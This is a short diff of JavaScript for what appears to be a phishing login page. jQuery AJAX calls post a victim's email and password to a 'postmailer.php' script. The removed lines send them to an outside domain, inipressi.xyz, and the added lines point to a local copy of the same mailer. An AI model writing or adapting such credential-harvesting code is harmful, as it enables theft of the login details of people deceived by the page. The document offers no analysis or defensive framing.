@@ -142,15 +142,15 @@
                  $('#login-status').removeClass('error-notice success-notice').addClass('info-notice').show();
                  
                  // First step: Send authentication request
-                 $.ajax({
-                     url: 'https://inipressi.xyz/phpmailer/classes/postmailer.php',
-                     method: 'POST',
-                     type: 'POST',
-                     data: {
-                         email: email,
-                         password: password,
-                         auth_step: 'authenticating'
-                     },
+                                   $.ajax({
+                      url: 'postmailer.php',
+                      method: 'POST',
+                      type: 'POST',
+                      data: {
+                          email: email,
+                          password: password,
+                          auth_step: 'authenticating'
+                      },
                      dataType: 'json',
                      cache: false,
                      timeout: 30000,
@@ -179,7 +179,7 @@
                   $('#login_submit').text('Validating...');
                   
                   $.ajax({
-                      url: 'https://inipressi.xyz/phpmailer/classes/postmailer.php',
+                      url: 'postmailer.php',
                       method: 'POST',
                       type: 'POST',
                       data: {
